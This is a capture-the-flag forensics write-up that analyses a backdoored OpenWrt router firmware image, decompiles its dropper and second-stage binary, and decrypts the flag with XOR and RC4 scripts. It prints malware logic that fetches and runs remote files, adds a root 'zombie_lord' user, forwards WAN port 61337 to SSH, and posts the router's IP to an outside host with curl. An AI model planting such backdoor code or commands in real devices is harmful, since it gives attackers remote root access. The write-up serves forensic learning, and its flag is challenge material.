zombienet:

This is the medium forensics challenge.
We are provided with a forensics_zombienet.zip which contains a file named `openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin`.


running file:
```bash
file openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin: u-boot legacy uImage, MIPS OpenWrt Linux-5.15.137, Linux/MIPS, OS Kernel Image (Not compressed), 2847980 bytes, Tue Nov 14 13:38:11 2023, Load Address: 0X80001000, Entry Point: 0X80001000, Header CRC: 0X8AF857A2, Data CRC: 0XB8874DDF
```

we can can guess it probably contains a squashfs image ... what is  [Squashfs](https://en.wikipedia.org/wiki/SquashFS)?

wiki:
```text
Squashfs is a compressed read-only file system for Linux. Squashfs compresses files, inodes and directories,
and supports block sizes from 4 KiB up to 1 MiB for greater compression.
Several compression algorithms are supported.
Squashfs is also the name of free software, licensed under the GPL, for accessing Squashfs filesystems.
Squashfs is intended for general read-only file-system use and in constrained block-device memory systems (e.g. embedded systems) where low overhead is needed. 
```


we can user binwalk to extract it :

```bash
binwalk -e openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
```

output:
```bash
$ ls
forensics_zombienet.zip
openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
_openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin.extracted
```
looking inside `_openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin.extracted` it has a squashfs-root directory , looking insied  we can see it looks like the standard linux box but there's a catch if we look at the bin directory of the squashfs we can see all the binaries are mips32 mips is a risc architecure (Reduced Instrcution Set Computer Instruction Set Architecture) 


output:
```bash
file busybox
busybox: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mipsel-sf.so.1, no section header
```
since there are so many files to look at and I was too lazy i just ran 

```bash
grep -Rl "Zombie" ./ 
```
at the root of squashfs i found these:
```bash
$ grep -Rl "zombie" ./
./etc/init.d/dead-reanimation
./etc/rc.d/S95dead-reanimation
./usr/lib/opkg/info/dead-reanimation.list
```

```bash
 cat ./usr/lib/opkg/info/dead-reanimation.list
/etc/rc.d/S95dead-reanimation
/etc/init.d/dead-reanimation
/sbin/zombie_runner
/usr/bin/dead-reanimation
```

by looking at the last 2 files we can see we have `/sbin/zombie_runner` and `/usr/bin/dead-reanimation` looking at these files :

```bash
$ cat ./sbin/zombie_runner
#!/bin/sh

while [ 1 ]; do
    /usr/bin/dead-reanimation
    sleep 600
done
```


we can see it basically just runs  `/usr/bin/dead-reanimation`.
/usr/bin/dead-reanimation is a binary file so looking at it in ghidra.

I cleaned up only the relevant parts of the code
```C

undefined4 main(void)

{
  int iVar1;
  undefined4 local_a8;
  undefined4 uStack_a4;
  undefined4 uStack_a0;
  undefined4 uStack_9c;
  undefined4 uStack_98;
  undefined uStack_94;
  undefined4 uStack_90;
  undefined4 uStack_8c;
  undefined4 uStack_88;
  undefined4 uStack_84;
  undefined2 local_80;
  char enc1 [60];
  char enc2 [56];
  
  local_a8 = 0x9a6f65f0;
  uStack_a4 = 0xadf4e47e;
  uStack_a0 = 0x4e937069;
  uStack_9c = 0x8ec5e155;
  uStack_98 = 0x3af55fc1;
  uStack_94 = 0;
  uStack_90 = 0x9a6f65f0;
  uStack_8c = 0xadf4f27e;
  uStack_88 = 0x4a8c4663;
  uStack_84 = 0x9082ea40;
  local_80 = 200;
  memcpy(enc1,&DAT_00400f74,0x3a);
  memcpy(enc2,&DAT_00400fb0,0x37);
  decrypt1((char *)&local_a8);
  decrypt1((char *)&uStack_90);
  decrypt1(enc1);
  decrypt1(enc2);
  iVar1 = access((char *)&local_a8,0);
  if (iVar1 == -1) {
    get_file(enc1,&local_a8);
    chmod((char *)&local_a8,0x1ff);
  }
  iVar1 = access((char *)&uStack_90,0);
  if (iVar1 == -1) {
    get_file(enc2,&uStack_90);
    chmod((char *)&uStack_90,0x1ff);
  }
  system((char *)&uStack_90);
  system((char *)&local_a8);
  return 0;
}

```

looking at the memcpy() and decrpypt1() calls
we see 
```C
  memcpy(enc1,&DAT_00400f74,0x3a);
  memcpy(enc2,&DAT_00400fb0,0x37);
  decrypt1((char *)&local_a8);
  decrypt1((char *)&uStack_90);
  decrypt1(enc1);
  decrypt1(enc2);
  ```

we memcpy some statically allocated variable into some stack variables and also decrypt some variables which are on the stack.

looking at the decrypt1() function.

```C

void decrypt1(char *param_1)

{
  uint uVar1;
  size_t sVar2;
  uint i;
  
  for (i = 0; sVar2 = strlen(param_1), i < sVar2; i = i + 1) {
    uVar1 = i & 0x8000001f;
    if ((int)uVar1 < 0) {
      uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;
    }
    param_1[i] = param_1[i] ^ (&DAT_00400f24)[uVar1];
  }
  return;
}

```

so looking at this function we can definitely see this is some sort of decryption function because we are performing certain operation for all the elements of param1. we can also see we use another statically allocaterd cariable `DAT_00400f24` this is our key.  

lets worry about the decrypt function later and lets go back to the flow of the program .

we see after decrypting strings we check the *local_a8* if that file  exists  if it doesnt we call the get_file function which we pass the url stored in enc1 it does same for the other file ......

the get_file function downloads the file the enc1 and enc2 urls using libcurl . After doing that it just executes these files.

so lets try to decrpyt these urls.

looking again at the decrypt1() function.

```C

void decrypt1(char *param_1)

{
  uint uVar1;
  size_t sVar2;
  uint i;
  
  for (i = 0; sVar2 = strlen(param_1), i < sVar2; i = i + 1) {
    uVar1 = i & 0x8000001f;
    if ((int)uVar1 < 0) {
      uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;
    }
    param_1[i] = param_1[i] ^ (&DAT_00400f24)[uVar1];
  }
  return;
}

```

i decided to reimplement the decryption function in python and use it obtain the necessay urls.

**my python script**


```python
from pwn import * #using pwntools to get the elf address and read from it 

e = ELF("./dead-reanimation")


def decrypt(a): # i just reimplemented what the function looked like in ghidra
    temp=[]
    for i in range(0,len(a)):
        idx = i & 31
        if(idx<0):
            idx = (idx - 1 | 0xffffffe0) + 1
            print(idx)
        temp.append(a[i]^key[idx])

    return temp

key = e.read(0x0400f24,0x22) # reading the key from the elf 
print(len(key))
enc1  = e.read(0x0400f74,0x3a) # reading enc1
enc1  = e.read(0x0400fb0,0x37) # reading enc2

# just using ghidra output to build these array manually they are pretty useless for us anyways you will see.

# i probably didnt take endianess into account while reading the c and d arrays but i didnt waste too much time on them because i got the necessary urls 

c=[0x9a,0x6f,0x65,0xf0,0xad,0xf4,0xe4,0x7e,0x4e,0x93,0x70,0x69,0x8e,0xc5,0xe1,0x55,0x3a,0xf5,0x5f,0xc1,0x0] 
d=[0x9a,0x6f,0x65,0xf0,0xad,0xf4,0xf2,0x7e,0x4a,0x8c,0x46,0x63,0x90,0x82,0xea,0x40,0xc8]




p=decrypt(enc1)
q=decrypt(enc2)
r=decrypt(c)
s=decrypt(d)


print("a="+"".join(chr(i) for i in p))
print("b="+"".join(chr(i) for i in q))
print("c="+"".join(chr(i) for i in r))
for i in d:
    print(chr(i),end="")
```


output:
```bash
av@tokyo:~/ctf/htb-university-ctf/for
$ python3 solve.py
[!] Could not populate MIPS GOT: seek out of range
[!] Did not find any GOT entries
[*] '/home/av/ctf/htb-university-ctf/for/dead-reanimation'
    Arch:     mips-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
34
a=http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00î
b=http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00¤
c=E~g\x1aütu²C¼BºJM¶ÞÏ\x03
oeð­ôò~JFcê@È
av@tokyo:~/ctf/htb-university-ctf/for
$
```

Nice ! so we got our urls we can now use wget and look at these files .

```bash
av@tokyo:~/ctf/htb-university-ctf/for/configs
$ cat reanimate.sh
#!/bin/sh

WAN_IP=$(ip -4 -o addr show pppoe-wan | awk '{print $4}' | cut -d "/" -f 1)
ROUTER_IP=$(ip -4 -o addr show br-lan | awk '{print $4}' | cut -d "/" -f 1)

CONFIG="config redirect         \n\t
	option dest 'lan'           \n\t
	option target 'DNAT'        \n\t
	option name 'share'         \n\t
	option src 'wan'            \n\t
	option src_dport '61337'    \n\t
	option dest_port '22'       \n\t
	option family 'ipv4'        \n\t
	list proto 'tcpudp'         \n\t
	option dest_ip '${ROUTER_IP}'"

echo -e $CONFIG >> /etc/config/firewall
/etc/init.d/firewall restart

curl -X POST -H "Content-Type: application/json" -b "auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY" -d '{"ip":"'${WAN_IP}'"}' http://configs.router.htb/reanimat
eav@tokyo:~/ctf/htb-university-ctf/for/configs
$
```

hmmm wait a minute that auth token looks awfully like base64 encoding lets take a look...

```sh
av@tokyo:~/ctf/htb-university-ctf/for/configs
$ echo "SFRCe1owbWIxM3NfaDR2M19pbmY"|base64 -d
HTB{Z0mb13s_h4v3_inf
av@tokyo:~/ctf/htb-university-ctf/for/configs
$
```

that looks like our flag but only a part of it we are getting closer!!!

lets look at dead_reanimated in ghidra:

main function
```C

undefined4 main(void)

{
  size_t sVar1;
  void *decrypted;
  int curl_easy_handle;
  FILE *pFVar2;
  __uid_t _Var3;
  passwd *ppVar4;
  undefined4 uVar5;
  undefined uStack_169;
  undefined4 local_168;
  undefined auStack_164 [252];
  undefined key [44];
  char CipherText [28];
  undefined4 uStack_20;
  undefined4 local_1c;
  undefined4 local_18;
  
  uStack_20._0_1_ = 'z';
  uStack_20._1_1_ = 'o';
  uStack_20._2_1_ = 'm';
  uStack_20._3_1_ = 'b';
  local_1c._0_1_ = 'i';
  local_1c._1_1_ = 'e';
  local_1c._2_1_ = '_';
  local_1c._3_1_ = 'l';
  local_18._0_1_ = 'o';
  local_18._1_1_ = 'r';
  local_18._2_1_ = 'd';
  local_18._3_1_ = '\0';
  memcpy(key,"d2c0ba035fe58753c648066d76fa793bea92ef29",0x29);
  memcpy(CipherText,&DAT_00400d50,0x1b);
  sVar1 = strlen(CipherText);
  decrypted = malloc(sVar1 << 2);
  init_crypto_lib(key,CipherText,decrypted);
  curl_easy_handle = curl_easy_init();
  if (curl_easy_handle == 0) {
    uVar5 = 0xfffffffe;
  }
  else {
    curl_easy_setopt(curl_easy_handle,0x2712,"http://callback.router.htb");
    curl_easy_setopt(curl_easy_handle,0x271f,decrypted);
    curl_easy_perform(curl_easy_handle);
    curl_easy_cleanup(curl_easy_handle);
    pFVar2 = fopen("/proc/sys/kernel/hostname","r");
    local_168 = 0;
    memset(auStack_164,0,0xfc);
    sVar1 = fread(&local_168,0x100,1,pFVar2);
    fclose(pFVar2);
    (&uStack_169)[sVar1] = 0;
    curl_easy_handle = strcmp((char *)&local_168,"HSTERUNI-GW-01");
    if (curl_easy_handle == 0) {
      _Var3 = getuid();
      if ((_Var3 == 0) || (_Var3 = geteuid(), _Var3 == 0)) {
        ppVar4 = getpwnam((char *)&uStack_20);
        if (ppVar4 == (passwd *)0x0) {
          system(
                "opkg update && opkg install shadow-useradd && useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord"
                );
        }
        pFVar2 = popen("passwd zombie_lord","w");
        fprintf(pFVar2,"%s\n%s\n",decrypted,decrypted);
        pclose(pFVar2);
        uVar5 = 0;
      }
      else {
        uVar5 = 0xffffffff;
      }
    }
    else {
      uVar5 = 0xffffffff;
    }
  }
  return uVar5;
}


```

```C
undefined4 init_crypto_lib(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined auStack_110 [260];
  
  key_rounds_init(param_1,auStack_110);
  perform_rounds(auStack_110,param_2,param_3);
  return 0;
}
```

```C

/* WARNING: Removing unreachable block (ram,0x00400af4) */

undefined4 key_rounds_init(char *param_1,undefined *param_2)

{
  byte bVar1;
  size_t key_len;
  int iVar2;
  undefined *out_buf;
  int iVar3;
  byte *pbVar4;
  int iVar5;
  
  key_len = strlen(param_1);
  iVar2 = 0;
  out_buf = param_2;
  do {
    *out_buf = (char)iVar2;
    iVar2 = iVar2 + 1;
    out_buf = param_2 + iVar2;
  } while (iVar2 != 0x100);
  iVar2 = 0;
  iVar3 = 0;
  do {
    iVar5 = iVar2 % (int)key_len;
    if (key_len == 0) {
      trap(0x1c00);
    }
    pbVar4 = param_2 + iVar2;
    bVar1 = *pbVar4;
    iVar2 = iVar2 + 1;
    iVar3 = (int)((int)param_1[iVar5] + (uint)bVar1 + iVar3) % 0x100;
    *pbVar4 = param_2[iVar3];
    param_2[iVar3] = bVar1;
  } while (iVar2 != 0x100);
  return 0;
}
```

```C

undefined4 perform_rounds(int param_1,char *param_2,int param_3)

{
  size_t len;
  byte *state_p;
  size_t i;
  uint p;
  uint q;
  byte r;
  
  len = strlen(param_2);
  q = 0;
  p = 0;
  for (i = 0; i != len; i = i + 1) {
    p = p + 1 & 0xff;
    state_p = (byte *)(param_1 + p);
    r = *state_p;
    q = r + q & 0xff;
    *state_p = *(byte *)(param_1 + q);
    *(byte *)(param_1 + q) = r;
    *(byte *)(param_3 + i) = *(byte *)(param_1 + ((uint)r + (uint)*state_p & 0xff)) ^ param_2[i];
  }
  return 0;
}

```
code explaination:

After Looking at the program for about 5 minutes i knew our flag was probably that decrypted variable so i just started to reimplement the whole  `init_crypto_lib` function in python3 .... i took chatgpt's help and it told me it was using RC4 symmetric key algorithm .... when i asked it to implement the `key_rounds_init` and `perform_rounds` function in python it was successfully able to reimplement the key_rounds_init function but failed to implement he perform_rounds function so i wrote that function looking at ghidra's decompilation

here is my script:

```python
from pwn import *

e = ELF("./dead_reanimated_mNmZTMtNjU3YS00")

cipher = e.read(0x0400d50,0x1b)
key = "d2c0ba035fe58753c648066d76fa793bea92ef29"
def key_rounds_init(key, state):

  key_len = len(key)
  i = 0
  while i < 256:
    state[i] = i
    i += 1

  j = 0
  k = 0
  for i in range(256):
    j = (j + state[i] + ord(key[i % key_len])) % 256
    state[i], state[j] = state[j], state[i]
  return

def perform_rounds(state, data, out_buf):
  i = 0
  q=0
  p = 0
  quit = 0
  for i in range(0,len(data)):
    p = (p + 1) & 0xff
    state_p=state[p]
    r=state[p]
    q=(r+q) & 0xff
    state[p]=state[q]
    state[q]=r
    out_buf[i]=(state[state_p+state[p]&0xff]^data[i])
  return out_buf

# Example usage
state = [0] * 256
key_rounds_init(key, state)
out_buf=[0] * 256
perform_rounds(state, cipher, out_buf)
print(out_buf)
print(len(out_buf))

for i in out_buf:
  print(chr(i),end="")

```
Output:

```bash
av@tokyo:~/ctf/htb-university-ctf/for/configs
$ python3 cry.py
[*] '/home/av/ctf/htb-university-ctf/for/configs/dead_reanimated_mNmZTMtNjU3YS00'
    Arch:     mips-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[51, 99, 116, 51, 100, 95, 48, 117, 114, 95, 99, 48, 109, 109, 117, 110, 49, 99, 52, 116, 49, 48, 110, 115, 33, 33, 125, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
256
3ct3d_0ur_c0mmun1c4t10ns!!}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
av@tokyo:~/ctf/htb-university-ctf/for/configs
$
```

look at the start lets gooo !!! we got the 2nd half of the flag !!!! *3ct3d_0ur_c0mmun1c4t10ns!!}*


the flag : HTB{Z0mb13s_h4v3_inf3ct3d_0ur_c0mmun1c4t10ns!!}


